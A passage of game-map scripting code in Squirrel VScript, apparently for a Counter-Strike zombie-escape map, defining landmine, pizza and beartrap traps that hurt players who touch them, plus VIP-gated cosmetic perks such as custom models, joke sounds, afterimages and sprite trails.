						EntFireByHandle(self,"Enable","",0.15,null,null);
						local item = ::manager.GetScriptScope().global_items_h[RandomInt(0,::manager.GetScriptScope().global_items_h.len()-1)];
						item.template.Spawn(self.GetOrigin());
						EntFireByHandle(self,"RunScriptCode"," RunPost(); ",0.10,null,null);
					}});
			}});
		}
	},
	landmine = {
			magnitude = 5000,
			radiusoverride = 100,
			print_chat = true,
		function Spawn(pos,rot=null){
			if(rot==null)rot = Vector(0,RandomFloat(0,360),0);
			//::manager.PrecacheModel("models/luffaren/landmine.mdl");
			//::Ent(pos,rot,"prop_physics_override",{
			::Ent(pos,rot,"prop_dynamic",{					//__CSS__ no more physics
					model="models/luffaren/landmine.mdl",
					modelscale = 1.00,
					spawnflags = 14,
					DisableBoneFollowers = true,
				},{
				function Run(){
				::CreateCostCleaner(self,2);
				::Ent(self.GetOrigin(),self.GetAngles(),"trigger_multiple",{
						spawnflags = 1,
						filtername = "filter_ct",
					},{
					model = self,
					touched = false,
					function Touch(){
						if(touched)return;
						touched = true;
						local toucher = activator;	//__CSS__ activator may get reset, store toucher
						EntFireByHandle(model,"Kill","",0.00,null,null);
						EntFireByHandle(self,"Kill","",0.00,null,null);
						::Sound("weapons/sensorgrenade/sensor_explode.wav",self.GetOrigin()+Vector(0,0,4),null,2500,0.20,RandomInt(90,110),10);
						::Sound("weapons/g3sg1/g3sg1_distant_01.wav",self.GetOrigin()+Vector(0,0,4),null,10000,0.20,RandomInt(90,110),10);
						::Ent(self.GetOrigin()+Vector(0,0,4),Vector(),"env_explosion",{
								//fireballsprite = "sprites/zerogxplode.spr", //__CSS__ this shouldnt be needed
								iMagnitude = (0+::TRAPS.landmine.magnitude),
								iRadiusOverride = (0+::TRAPS.landmine.radiusoverride),
								rendermode = 5,
								spawnflags = 2,
								rendercolor = "255 255 255",
							},{function Run(){
								EntFireByHandle(self,"Explode","",0.00,null,null);
								EntFireByHandle(self,"Kill","",0.05,null,null);
							}});
						if(::TRAPS.landmine.print_chat)::PlayerNameMessage(toucher,""," stepped on a landmine");
					},function Run(){
						::CreateTemCleaner(self,{
							model=model,
							trigger=self,
							function Clean(){
								if(model==null||!model.IsValid()){}else EntFireByHandle(model,"Kill","",0.00,null,null);
								if(trigger==null||!trigger.IsValid()){}else EntFireByHandle(trigger,"Kill","",0.00,null,null);
							}});
						EntFireByHandle(self,"RunScriptCode","self.SetSolid(3);",0.00,null,null);
						EntFireByHandle(self,"RunScriptCode","self.SetCollisionGroup(10);",0.00,null,null);
						EntFireByHandle(self,"AddOutput","mins -3 -3 -1",0.00,null,null);
						EntFireByHandle(self,"AddOutput","maxs 3 3 2",0.00,null,null);
						EntFireByHandle(self,"AddOutput","OnStartTouch !self:RunScriptCode:Touch();:0:-1",0.00,null,null);
						EntFireByHandle(self,"Enable","",0.10,null,null);
					}});
			}});
		}
	},
	pizza = {
			sound_stack = 3,
			print_chat = true,
		function Spawn(pos,rot=null){
			if(rot==null)rot = Vector(0,RandomFloat(0,360),0);
			//::manager.PrecacheModel("models/luffaren/pizza.mdl");
			::Ent(pos,rot,"prop_dynamic",{
					model="models/luffaren/pizza.mdl",
					modelscale = 3.50,			//__CSS__ og was 15.00, but it was *HUGE*
				},{
				function Run(){
				::CreateCostCleaner(self,2);
				::Ent(self.GetOrigin(),self.GetAngles(),"trigger_multiple",{
						spawnflags = 1,
						filtername = "filter_ct",
					},{
					model = self,
					function Touch(){
						local toucher = activator;	//__CSS__ activator may get reset, store toucher
						if(::TRAPS.pizza.print_chat)::PlayerNameMessage(toucher,"***THE PIZZA IS AGGRESSIVE*** (towards ",")",1.55);
						else ::ServerSay("say ***THE PIZZA IS AGGRESSIVE***",1.55,null);
						EntFireByHandle(toucher,"SetHealth","-1",0.00,null,null);
						local randpitch = RandomInt(95,105);
						for(local i=0;i<::TRAPS.pizza.sound_stack;i++){
							::Sound("*luffaren/pizza_aggressive.mp3",self.GetOrigin()+Vector(0,0,8),null,10000,0.10,randpitch,100);
							::Sound("*luffaren/pizza_splotion.mp3",self.GetOrigin()+Vector(0,0,8),null,30000,0.10,randpitch,100);}
						::Particle("blood_advisor_puncture_withdraw",toucher.GetOrigin(),Vector(90+RandomInt(-15,15),RandomInt(0,360),RandomInt(-15,15)),null,0.05);
						::Particle("muzzle_rifles",toucher.GetOrigin(),Vector(90+RandomInt(-15,15),RandomInt(0,360),RandomInt(-15,15)),null,0.05);
					},function Run(){
						::CreateTemCleaner(self,{
							model=model,
							trigger=self,
							function Clean(){
								if(model==null||!model.IsValid()){}else EntFireByHandle(model,"Kill","",0.00,null,null);
								if(trigger==null||!trigger.IsValid()){}else EntFireByHandle(trigger,"Kill","",0.00,null,null);
							}});
						EntFireByHandle(self,"RunScriptCode","self.SetSolid(3);",0.00,null,null);
						EntFireByHandle(self,"RunScriptCode","self.SetCollisionGroup(10);",0.00,null,null);
						EntFireByHandle(self,"AddOutput","mins -4 -4 -1",0.00,null,null);
						EntFireByHandle(self,"AddOutput","maxs 4 4 2",0.00,null,null);
						EntFireByHandle(self,"AddOutput","OnStartTouch !self:RunScriptCode:Touch();:0:-1",0.00,null,null);
						EntFireByHandle(self,"Enable","",0.10,null,null);
					}});
			}});
		}
	},
	beartrap = {
			damage = 69,			//how much damage to deal to player who steps in it
			freezetime = 10.00,		//how long to freeze player who steps in it (seconds)
			print_chat = true,
		function Spawn(pos,rot=null){
			if(rot==null)rot = Vector(0,RandomFloat(0,360),0);
			//::manager.PrecacheModel("models/luffaren/beartrap.mdl");
			::Ent(pos,rot,"prop_dynamic",{
					model="models/luffaren/beartrap.mdl",
				},{
				function Run(){
				::CreateCostCleaner(self,2);
				::Ent(self.GetOrigin(),self.GetAngles(),"trigger_multiple",{
					spawnflags = 1,
					filtername = "filter_ct",
				},{
					touched = false,
					model = self,
					function Touch(){
						if(touched)return;
						touched = true;
						local toucher = activator;	//__CSS__ activator may get reset, store toucher
						//EntFireByHandle(model,"fadeandkill","2",::TRAPS.beartrap.freezetime+0.5,null,null);
						::FadeAndKill(model,2.00,::TRAPS.beartrap.freezetime+0.5);		//__CSS__ fadeandkill doesn't exist in css
						EntFireByHandle(model,"Kill","",::TRAPS.beartrap.freezetime+2.4,null,null);
						EntFireByHandle(self,"Kill","",0.05,null,null);
						EntFireByHandle(model,"SetAnimation","snap",0.00,null,null);
						EntFireByHandle(model,"SetAnimation","idle",::TRAPS.beartrap.freezetime,null,null);
						EntFireByHandle(model,"SetDefaultAnimation","idle",::TRAPS.beartrap.freezetime+0.01,null,null);
						EntFireByHandle(model,"RunScriptCode",
							"::Sound(\"*luffaren/sliced.mp3\",self.GetOrigin()+Vector(0,0,8),null,500,0.10,RandomInt(240,255),100);",
							::TRAPS.beartrap.freezetime,null,null);
						EntFireByHandle(model,"SetDefaultAnimation","snapped",0.01,null,null);
						local newhp = toucher.GetHealth()-::TRAPS.beartrap.damage;
						EntFireByHandle(toucher,"SetHealth",newhp.tostring(),0.00,null,null);
						if(newhp > 0)
						{
							EntFireByHandle(toucher,"AddOutput","movetype 0",0.00,null,null);
							EntFireByHandle(toucher,"AddOutput","movetype 2",::TRAPS.beartrap.freezetime,null,null);
							toucher.SetVelocity(Vector());
						}
						::Sound("*luffaren/sliced.mp3",self.GetOrigin()+Vector(0,0,8),null,2000,0.10,RandomInt(50,60),100);
						::Sound("*luffaren/sliced.mp3",self.GetOrigin()+Vector(0,0,8),null,2500,0.10,RandomInt(90,100),100);
						::Sound("*luffaren/sliced.mp3",self.GetOrigin()+Vector(0,0,8),null,3000,0.10,RandomInt(170,200),100);
						::Particle("blood_advisor_puncture_withdraw",toucher.GetOrigin(),Vector(90+RandomInt(-15,15),RandomInt(0,360),RandomInt(-15,15)),null,0.10);
						if(::TRAPS.beartrap.print_chat)::PlayerNameMessage(toucher,""," got caught in a beartrap");
					},function Run(){
						::CreateTemCleaner(self,{
							model=model,
							trigger=self,
							function Clean(){
								if(model==null||!model.IsValid()){}else EntFireByHandle(model,"Kill","",0.00,null,null);
								if(trigger==null||!trigger.IsValid()){}else EntFireByHandle(trigger,"Kill","",0.00,null,null);
							}});
						EntFireByHandle(self,"RunScriptCode","self.SetSolid(3);",0.00,null,null);
						EntFireByHandle(self,"RunScriptCode","self.SetCollisionGroup(10);",0.00,null,null);
						EntFireByHandle(self,"AddOutput","mins -4 -4 -1",0.00,null,null);
						EntFireByHandle(self,"AddOutput","maxs 4 4 4",0.00,null,null);
						EntFireByHandle(self,"AddOutput","OnStartTouch !self:RunScriptCode:Touch();:0:1",0.00,null,null);
						EntFireByHandle(self,"Enable","",0.10,null,null);
					}});
			}});
		}
	},
};

::patron_afterimage_max <- 8;				//how many active afterimage users there can be in total (edict reasons)
::patron_afterimage_amt <- 0;
::patron_sound_cooldown <- 0.20;			//how long the global cooldown is for playing random sounds (between all users, shared cd)
::patron_sound_lifetime <- 1.00;			//how long the sound lifetime should be
::patron_sound_allow_t <- false;			//allow T's/zombies to play it as well (if they got zombiefied later on)
::patron_sound_pitch_min <- 85;				//the min pitch to play sounds at (randomly)
::patron_sound_pitch_max <- 105;			//the max pitch to play sounds at (randomly)
::patron_sound_list <- [					//soundlist for the sound playing
		"*luffaren/fart.mp3",
		"*luffaren/fart.mp3",
		"*luffaren/fart.mp3",
		"*luffaren/fart.mp3",
		"*luffaren/fart.mp3",
		"*luffaren/fart_reverb.mp3",
		"*luffaren/fart_reverb.mp3",
		"*luffaren/fart_wet.mp3",
		"*luffaren/fart_wet_short.mp3",
		"*luffaren/agony.mp3",
		"*luffaren/shellbert_despair.mp3",
		"*luffaren/papaj_nooo.mp3",
		"*luffaren/papaj_mommy.mp3",
		"*luffaren/zolix_drunk.mp3",
		"*luffaren/popgasm.mp3",
		"*luffaren/popgasm.mp3",
		"*luffaren/luff_hello.mp3",
		"*luffaren/luff_hello.mp3",
		"*luffaren/luff_hello.mp3",
		"*luffaren/luff_hello.mp3",
		"*luffaren/luff_hello.mp3",
		"*luffaren/gachi_fuckyou.mp3",
		"*luffaren/huh.mp3",
		"*luffaren/emotional_damage.mp3",
		"*luffaren/dad_snore.mp3",
		"*luffaren/minging.mp3",
		"*luffaren/copy_that.mp3",
		"*luffaren/chrishansen_1.mp3",
		"*luffaren/chrishansen_7.mp3",
		"*luffaren/chrishansen_8.mp3",
		"*luffaren/chrishansen_9.mp3",
	];
::patron_sound_cooldownstate <- false;
::patron_sounders <- [];
::patron_chatmsgtitlers <- [];
if(::GetPlayerCount()<17)scandt=null;
if(!("patron_chatmsg_max" in this))::patron_chatmsg_max <- 3000;	//the max persisting amount of chat texts to set, then lock to only 1 per round (gamestring leaks)
if(!("patron_chatmsg_amt" in this))::patron_chatmsg_amt <- 0;
::patron_cheapmodel <- true;				//set to 'false' to disallow 'playercheap_ct_nohitbox.mdl' in case it causes issues
::patron_out_of_spawn_split <- 0.70;		//the percentage (0.00-1.00) of the spawn bufferbridge to TP the player at (1.00 = all the way, 0.50 = halfway)
::fade_patron <- null;
::gametext_patron <- null;
::gametext_patron_channel <- 2;				//game_text channel to use for the vip/patron-denied message
patrondir <- Vector(1,0,0);
patronmodels <- [							//list of available playermodels to choose from
		"models/player/custom_player/luffaren/chadthundercock.mdl",
		"models/player/custom_player/luffaren/jarjarbinks.mdl",
		"models/player/custom_player/luffaren/mister_muscle.mdl",
		"models/player/custom_player/luffaren/pizzaplayer.mdl",
		"models/player/custom_player/luffaren/santa.mdl",
	];
if(::patron_cheapmodel && !::CHEAP_PLAYERMODELS)
	
	//patronmodels.push("models/player/custom_player/luffaren/playercheap_ct_nohitbox.mdl");		//__CSS__ removed model
	patronmodels.push("models/player/custom_player/luffaren/playercheap_ct.mdl");
	
patronfeatures <- [							//list of patron-features that can be set by walking into the text
		//{text="xxxxxxxx",function Spawn(pos,rot){::Ent(pos,rot,"trigger_multiple",{spawnflags=1,targetname="patronstuff"},{function Touch(){
		//		if(::MOTHER_ZOMBIE_SPAWNED||activator.GetHealth()>1002||activator.IsAlive()==false)return;
		//		local vipstatus=::IsVIP(activator);if(vipstatus==null)return;
		//		if(!vipstatus){EntFireByHandle(::gametext_patron,"Display","",0.00,activator,null);return;}
		//		EntFireByHandle(::fade_patron,"Fade","",0.00,activator,null);
		//			//SUCCESS - DO SHIT HERE
		//	},function Run(){EntFireByHandle(self,"AddOutput","OnStartTouch !self:RunScriptCode:Touch();:0:-1",0.00,null,null);
		//		EntFireByHandle(self,"RunScriptCode","self.SetSolid(3);",0.00,null,null);EntFireByHandle(self,"RunScriptCode","self.SetCollisionGroup(10);",0.00,null,null);
		//		EntFireByHandle(self,"AddOutput","mins -2 -2 -2",0.00,null,null);EntFireByHandle(self,"AddOutput","maxs 2 2 70",0.00,null,null);
		//		EntFireByHandle(self,"SetParent","spawnplatform",0.00,null,null);EntFireByHandle(self,"Enable","",0.05,null,null);}});
		//}},
		{text="TP-from-spawn",function Spawn(pos,rot){::Ent(pos,rot,"trigger_multiple",{spawnflags=1,targetname="patronstuff"},{function Touch(){
				local toucher = activator;	//__CSS__ activator may get reset, store toucher
				if(::MOTHER_ZOMBIE_SPAWNED||toucher.GetHealth()>1002||toucher.IsAlive()==false)return;
				local vipstatus=::IsVIP(toucher);if(vipstatus==null)return;
				if(!vipstatus){EntFireByHandle(::gametext_patron,"Display","",0.00,toucher,null);return;}
				EntFireByHandle(::fade_patron,"Fade","",0.00,toucher,null);
					local bfs = (0.00+::manager.GetScriptScope().BUFFER_SIZE_SPAWN);
					if(::patron_out_of_spawn_split < 0.00)::patron_out_of_spawn_split = 0.00;
					else if(::patron_out_of_spawn_split > 1.00)::patron_out_of_spawn_split = 1.00;
					bfs *= ::patron_out_of_spawn_split;
					if(bfs < 0.00)bfs = 0.00;
					if(::finale_started)
						toucher.SetOrigin(Vector(0,0,4)+(::spawnarea_direction*(470+(0*::manager.GetScriptScope().GRID_SIZE))));
					else
						toucher.SetOrigin(Vector(0,0,4)+(::spawnarea_direction*(560+(bfs*::manager.GetScriptScope().GRID_SIZE))));
					toucher.SetVelocity(Vector());
					toucher.SetForwardVector(::spawnarea_direction);
			},function Run(){EntFireByHandle(self,"AddOutput","OnStartTouch !self:RunScriptCode:Touch();:0:-1",0.00,null,null);
				EntFireByHandle(self,"RunScriptCode","self.SetSolid(3);",0.00,null,null);EntFireByHandle(self,"RunScriptCode","self.SetCollisionGroup(10);",0.00,null,null);
				EntFireByHandle(self,"AddOutput","mins -2 -2 -2",0.00,null,null);EntFireByHandle(self,"AddOutput","maxs 2 2 70",0.00,null,null);
				EntFireByHandle(self,"SetParent","spawnplatform",0.00,null,null);EntFireByHandle(self,"Enable","",0.05,null,null);}});
		}},
		{text="Chatmsg-title",function Spawn(pos,rot){::Ent(pos,rot,"trigger_multiple",{spawnflags=1,targetname="patronstuff"},{function Touch(){
				local toucher = activator;	//__CSS__ activator may get reset, store toucher
				if(::MOTHER_ZOMBIE_SPAWNED||toucher.GetHealth()>1002||toucher.IsAlive()==false)return;
				local vipstatus=::IsVIP(toucher);if(vipstatus==null)return;
				if(!vipstatus){EntFireByHandle(::gametext_patron,"Display","",0.00,toucher,null);return;}
					toucher.ValidateScriptScope();
					if("patron_chatmsg" in toucher.GetScriptScope())return;
					local pc = ::GetPlayerClass(toucher);
					if(pc==null)return;
					if(::DEVID!=null&&::DEVID==pc.userid)EntFire("devsprite","HideSprite","",0.00,null);
					::patron_chatmsgtitlers.push(pc.userid);
					EntFireByHandle(::fade_patron,"Fade","",0.00,toucher,null);
					toucher.SetVelocity(Vector());
					local emsg = Entities.CreateByClassname("point_worldtext");
					emsg.SetOrigin(toucher.GetOrigin()+Vector(0,0,80));
					emsg.SetForwardVector(toucher.GetForwardVector() * -1);
					emsg.__KeyValueFromString("message","");
					emsg.__KeyValueFromInt("textsize",8);
					emsg.__KeyValueFromVector("color",Vector(255,255,255));
					EntFireByHandle(emsg,"SetParent","!activator",0.00,toucher,null);
					toucher.GetScriptScope().patron_chatmsg <- emsg;
					emsg.ValidateScriptScope();
					emsg.GetScriptScope().master <- toucher;
					emsg.GetScriptScope().userid <- pc.userid;
					emsg.GetScriptScope().Tick <- function()
					{
						if(master==null||!master.IsValid()||master.IsAlive()==false||::MOTHER_ZOMBIE_SPAWNED&&master.GetTeam()!=3)
						{
							EntFireByHandle(self,"Kill","",0.00,null,null);
							for(local i=0;i<::patron_chatmsgtitlers.len();i++)
							{
								if(::patron_chatmsgtitlers[i] == userid)
								{
									::patron_chatmsgtitlers.remove(i);
									break;
								}
							}
							return;
						}
						EntFireByHandle(self,"RunScriptCode"," Tick(); ",1.00,null,null);
					};
					EntFireByHandle(emsg,"RunScriptCode"," Tick(); ",1.00,null,null);
			},function Run(){EntFireByHandle(self,"AddOutput","OnStartTouch !self:RunScriptCode:Touch();:0:-1",0.00,null,null);
				EntFireByHandle(self,"RunScriptCode","self.SetSolid(3);",0.00,null,null);EntFireByHandle(self,"RunScriptCode","self.SetCollisionGroup(10);",0.00,null,null);
				EntFireByHandle(self,"AddOutput","mins -2 -2 -2",0.00,null,null);EntFireByHandle(self,"AddOutput","maxs 2 2 70",0.00,null,null);
				EntFireByHandle(self,"SetParent","spawnplatform",0.00,null,null);EntFireByHandle(self,"Enable","",0.05,null,null);}});
		}},
		{text="SHIFT:playsound",function Spawn(pos,rot){::Ent(pos,rot,"trigger_multiple",{spawnflags=1,targetname="patronstuff"},{function Touch(){
				local toucher = activator;	//__CSS__ activator may get reset, store toucher
				if(::MOTHER_ZOMBIE_SPAWNED||toucher.GetHealth()>1002||toucher.IsAlive()==false)return;
				local vipstatus=::IsVIP(toucher);if(vipstatus==null)return;
				if(!vipstatus){EntFireByHandle(::gametext_patron,"Display","",0.00,toucher,null);return;}
					local pc = ::GetPlayerClass(toucher);
					if(pc==null)return;
					foreach(f in ::patron_sounders){if(f==pc.userid)return;}
					::patron_sounders.push(pc.userid);
					EntFireByHandle(::fade_patron,"Fade","",0.00,toucher,null);
					
					//__CSS__ patron sound listener (NEW)
					::ShiftListener(toucher,{
						pchandle = toucher,
						function EventFired(name,data){
							if(::patron_sound_cooldownstate)return;
							if(this.pchandle==null||!pchandle.IsValid()||this.pchandle.IsAlive()==false)return;
							if(!::patron_sound_allow_t && ::MOTHER_ZOMBIE_SPAWNED && this.pchandle.GetTeam()!=3)return;
							::patron_sound_cooldownstate = true;
							EntFire("manager","RunScriptCode"," ::patron_sound_cooldownstate = false; ",::patron_sound_cooldown,null);
							::Sound(::patron_sound_list[RandomInt(0,::patron_sound_list.len()-1)],Vector(),this.pchandle,5000,
							::patron_sound_lifetime,RandomInt(::patron_sound_pitch_min,::patron_sound_pitch_max),10);
						}});
					
					
			},function Run(){
				EntFireByHandle(self,"AddOutput","OnStartTouch !self:RunScriptCode:Touch();:0:-1",0.00,null,null);
				EntFireByHandle(self,"RunScriptCode","self.SetSolid(3);",0.00,null,null);EntFireByHandle(self,"RunScriptCode","self.SetCollisionGroup(10);",0.00,null,null);
				EntFireByHandle(self,"AddOutput","mins -2 -2 -2",0.00,null,null);EntFireByHandle(self,"AddOutput","maxs 2 2 70",0.00,null,null);
				EntFireByHandle(self,"SetParent","spawnplatform",0.00,null,null);EntFireByHandle(self,"Enable","",0.05,null,null);
				
				//__CSS__ patron sound listener (OLD)
				/*
				::EventListener("inspect_weapon",{function EventFired(name,data){
						if(::patron_sound_cooldownstate)return;
						foreach(f in ::patron_sounders)
						{
							if(f==data.userid)
							{
								::patron_sound_cooldownstate = true;
								EntFire("manager","RunScriptCode"," ::patron_sound_cooldownstate = false; ",::patron_sound_cooldown,null);
								local pc = ::GetPlayerClass(data.userid);
								if(pc==null)return;
								if(pc.handle==null||!pc.handle.IsValid()||pc.handle.IsAlive()==false)return;
								if(!::patron_sound_allow_t && ::MOTHER_ZOMBIE_SPAWNED && pc.handle.GetTeam()!=3)return;
								::Sound(::patron_sound_list[RandomInt(0,::patron_sound_list.len()-1)],Vector(),pc.handle,5000,
								::patron_sound_lifetime,RandomInt(::patron_sound_pitch_min,::patron_sound_pitch_max),10);
								return;
							}
						}
					}});
				*/
				
				}});
		}},
		{text="AfterImage",function Spawn(pos,rot){::Ent(pos,rot,"trigger_multiple",{spawnflags=1,targetname="patronstuff"},{function Touch(){
				local toucher = activator;	//__CSS__ activator may get reset, store toucher
				if(::MOTHER_ZOMBIE_SPAWNED||toucher.GetHealth()>1002||toucher.IsAlive()==false)return;
				local vipstatus=::IsVIP(toucher);if(vipstatus==null)return;
				if(!vipstatus){EntFireByHandle(::gametext_patron,"Display","",0.00,toucher,null);return;}
					toucher.ValidateScriptScope();
					if("patron_afterimage" in toucher.GetScriptScope())return;
					if(::patron_afterimage_amt > ::patron_afterimage_max)return;
					::patron_afterimage_amt++;
					EntFireByHandle(::fade_patron,"Fade","",0.00,toucher,null);
					::Ent(Vector(),Vector(),"logic_relay",{},{
						master = toucher,
						function Tick(){
							if(master==null||!master.IsValid()||master.IsAlive()==false||::MOTHER_ZOMBIE_SPAWNED&&master.GetTeam()!=3){
								EntFireByHandle(self,"Kill","",0.00,null,null);return;}
							EntFireByHandle(self,"RunScriptCode"," Tick(); ",0.05,null,null);
							if(master.GetVelocity().Length() < 150)return;
							local model = master.GetModelName();		//self.PrecacheModel(model);
							::Ent(master.GetOrigin()-(master.GetLeftVector()*7)-(master.GetForwardVector()*10),master.GetAngles(),"prop_dynamic",{
									model = model,
									rendermode = 1,
									renderamt = 0,
								},{
								function Run(){
									EntFireByHandle(self,"SetAnimation","Idle_lower",0.00,null,null);
									EntFireByHandle(self,"AddOutput","renderamt 0",0.00,null,null);
									EntFireByHandle(self,"AddOutput","renderamt 10",0.01,null,null);
									EntFireByHandle(self,"AddOutput","renderamt 20",0.02,null,null);
									EntFireByHandle(self,"AddOutput","renderamt 40",0.03,null,null);
									EntFireByHandle(self,"AddOutput","renderamt 60",0.04,null,null);
									EntFireByHandle(self,"AddOutput","renderamt 80",0.05,null,null);
									EntFireByHandle(self,"AddOutput","renderamt 100",0.06,null,null);
									local ii = 0.07;
									for(local alpha=100;alpha>0;alpha-=5)
									{
										EntFireByHandle(self,"AddOutput","renderamt "+alpha.tostring(),ii,null,null);
										ii += 0.01;
									}
									EntFireByHandle(self,"Kill","",ii,null,null);
								}});
						},function Run(){
							master.ValidateScriptScope();
							master.GetScriptScope().patron_afterimage <- self;
							EntFireByHandle(self,"RunScriptCode"," Tick(); ",0.10,null,null);
						}});
			},function Run(){EntFireByHandle(self,"AddOutput","OnStartTouch !self:RunScriptCode:Touch();:0:-1",0.00,null,null);
				EntFireByHandle(self,"RunScriptCode","self.SetSolid(3);",0.00,null,null);EntFireByHandle(self,"RunScriptCode","self.SetCollisionGroup(10);",0.00,null,null);
				EntFireByHandle(self,"AddOutput","mins -2 -2 -2",0.00,null,null);EntFireByHandle(self,"AddOutput","maxs 2 2 70",0.00,null,null);
				EntFireByHandle(self,"SetParent","spawnplatform",0.00,null,null);EntFireByHandle(self,"Enable","",0.05,null,null);}});
		}},
		{text="Trail",function Spawn(pos,rot){::Ent(pos,rot,"trigger_multiple",{spawnflags=1,targetname="patronstuff"},{function Touch(){
				local toucher = activator;	//__CSS__ activator may get reset, store toucher
				if(::MOTHER_ZOMBIE_SPAWNED||toucher.GetHealth()>1002||toucher.IsAlive()==false)return;
				local vipstatus=::IsVIP(toucher);if(vipstatus==null)return;
				if(!vipstatus){EntFireByHandle(::gametext_patron,"Display","",0.00,toucher,null);return;}
					toucher.ValidateScriptScope();
					if("patron_trail" in toucher.GetScriptScope())return;
					EntFireByHandle(::fade_patron,"Fade","",0.00,toucher,null);
					toucher.SetVelocity(Vector());
					::Ent(toucher.GetOrigin()+Vector(0,0,8),Vector(),"env_spritetrail",{
							lifetime = 1.00,
							startwidth = 20,
							endwidth = 0.1,
							rendermode = 5,
							rendercolor = "0 200 255",
							renderamt = 255,
							spritename = "sprites/physbeam.vmt",
						},{
						master = toucher,
						function Tick(){
							if(master==null||!master.IsValid()||master.IsAlive()==false||::MOTHER_ZOMBIE_SPAWNED&&master.GetTeam()!=3){
								EntFireByHandle(self,"Kill","",0.00,null,null);return;}
							EntFireByHandle(self,"RunScriptCode"," Tick(); ",1.00,null,null);
						},function Run(){
							EntFireByHandle(self,"SetScale","1.00",0.60,null,null);
							EntFireByHandle(self,"ShowSprite","",0.50,null,null);
							EntFireByHandle(self,"SetParent","!activator",0.00,master,null);
							master.ValidateScriptScope();
							master.GetScriptScope().patron_trail <- self;
							EntFireByHandle(self,"RunScriptCode"," Tick(); ",1.00,null,null);
						}});
			},function Run(){EntFireByHandle(self,"AddOutput","OnStartTouch !self:RunScriptCode:Touch();:0:-1",0.00,null,null);
				EntFireByHandle(self,"RunScriptCode","self.SetSolid(3);",0.00,null,null);EntFireByHandle(self,"RunScriptCode","self.SetCollisionGroup(10);",0.00,null,null);
				EntFireByHandle(self,"AddOutput","mins -2 -2 -2",0.00,null,null);EntFireByHandle(self,"AddOutput","maxs 2 2 70",0.00,null,null);
				EntFireByHandle(self,"SetParent","spawnplatform",0.00,null,null);EntFireByHandle(self,"Enable","",0.05,null,null);}});
		}},
	];
function PatronSetup()
{
	::gametext_patron = Entities.CreateByClassname("game_text");
	::gametext_patron.__KeyValueFromString("message","[NO VIP STATUS]"+
			"\n"+"Possible reasons:"+
			"\n"+"1) You're not a patron/vip"+
			"\n"+"2) You need to rejoin the server"+
			"\n"+"3) You got patronage *after* the map/version release"+
			"\n"+"(servers running the 'luffarenmaps' plugin fixes #2+#3)");
	::gametext_patron.__KeyValueFromFloat("x",-1);
	::gametext_patron.__KeyValueFromFloat("y",0.10);
	::gametext_patron.__KeyValueFromFloat("fadein",0.00);
	::gametext_patron.__KeyValueFromFloat("fadeout",0.00);
	::gametext_patron.__KeyValueFromFloat("holdtime",20.00);
	::gametext_patron.__KeyValueFromInt("channel",::gametext_patron_channel);
	::gametext_patron.__KeyValueFromInt("effect",0);
	::gametext_patron.__KeyValueFromVector("color",Vector(255,50,0));
		::fade_patron = Entities.CreateByClassname("env_fade");
		::fade_patron.__KeyValueFromFloat("duration",0.50);
		::fade_patron.__KeyValueFromFloat("ReverseFadeDuration",0.50);
		::fade_patron.__KeyValueFromFloat("holdtime",0.00);
		::fade_patron.__KeyValueFromInt("spawnflags",5);
		::fade_patron.__KeyValueFromVector("rendercolor",Vector(50,200,255));
		EntFireByHandle(::fade_patron,"AddOutput","renderamt 150",0.00,null,null);
	::EventListener("player_say",{function EventFired(name,data){
			foreach(f in ::patron_chatmsgtitlers)
			{
				if(f==data.userid)
				{
					local pc = ::GetPlayerClass(data.userid);
					if(pc==null)return;
					if(pc.handle==null||!pc.handle.IsValid()||pc.handle.IsAlive()==false)return;
					pc.handle.GetScriptScope().patron_chatmsg.ValidateScriptScope();
					if("diddled" in pc.handle.GetScriptScope().patron_chatmsg.GetScriptScope())return;
					pc.handle.GetScriptScope().patron_chatmsg.__KeyValueFromString("message",data.text);
					
					
					pc.handle.GetScriptScope().patron_chatmsg.SetLocalOrigin(Vector(0,-(data.text.len().tofloat()*2.50),80));
					//EntFireByHandle(pc.handle.GetScriptScope().patron_chatmsg,"setlocalorigin","0 -"+(data.text.len().tofloat()*2.50).tostring()+" 80",0.00,null,null);
					
					
					if(::patron_chatmsg_amt >= ::patron_chatmsg_max)
						pc.handle.GetScriptScope().patron_chatmsg.GetScriptScope().diddled <- true;
					else ::patron_chatmsg_amt++;
					return;
				}
			}
		}});
	
	local patronamt = (patronmodels.len()+patronfeatures.len());
	local patrondist = 470.00;
	local ang_add = 10.00;
	local ang = 180.00-((patronamt.tofloat()/2)*ang_add);
	for(local i=0;i<patronmodels.len();i++)
	{
		ang+=ang_add;local sdir=::AnglesToDir(::DirToAngles(patrondir)+Vector(0,ang,0));local spos=Vector()+(sdir*patrondist);
		//self.PrecacheModel(patronmodels[i]);
		::Ent(spos,::DirToAngles(sdir)+Vector(0,180,0),"prop_dynamic",{model=patronmodels[i],targetname="patronstuff"},{model=patronmodels[i],function Run(){
				EntFireByHandle(self,"SetAnimation","Idle_lower",0.00,null,null);
				EntFireByHandle(self,"SetParent","spawnplatform",0.00,null,null);
				::Ent(self.GetOrigin(),self.GetAngles(),"trigger_multiple",{spawnflags=1,targetname="patronstuff"},{model=model,
					function Touch(){
						local toucher = activator;	//__CSS__ activator may get reset, store toucher
						if(::MOTHER_ZOMBIE_SPAWNED||toucher.GetHealth()>1002||toucher.IsAlive()==false)return;
						local vipstatus=::IsVIP(toucher);if(vipstatus==null)return;
						if(!vipstatus){EntFireByHandle(::gametext_patron,"Display","",0.00,toucher,null);return;}
						EntFireByHandle(::fade_patron,"Fade","",0.00,toucher,null);
						toucher.SetModel(model);
					},function Run(){
						EntFireByHandle(self,"SetParent","spawnplatform",0.00,null,null);
						EntFireByHandle(self,"AddOutput","OnStartTouch !self:RunScriptCode:Touch();:0:-1",0.00,null,null);
						EntFireByHandle(self,"RunScriptCode","self.SetSolid(3);",0.00,null,null);
						EntFireByHandle(self,"RunScriptCode","self.SetCollisionGroup(10);",0.00,null,null);
						EntFireByHandle(self,"AddOutput","mins -2 -2 -2",0.00,null,null);
						EntFireByHandle(self,"AddOutput","maxs 2 2 70",0.00,null,null);
						EntFireByHandle(self,"Enable","",0.05,null,null);
					}});
			}});
	}
	for(local i=0;i<patronfeatures.len();i++)
	{
		ang+=ang_add;local sdir=::AnglesToDir(::DirToAngles(patrondir)+Vector(0,ang,0));local spos=Vector()+(sdir*patrondist);
		local sdirleft = ::AnglesToDir(::DirToAngles(sdir)+Vector(0,90,0));
		local emsg = Entities.CreateByClassname("point_worldtext");
		
		//local zofs = 60;
		//if((i%2)==0)zofs = 70;
		//__CSS__ new below:
		local zofs = 10;
		if((i%2)==0)zofs = 15;
		
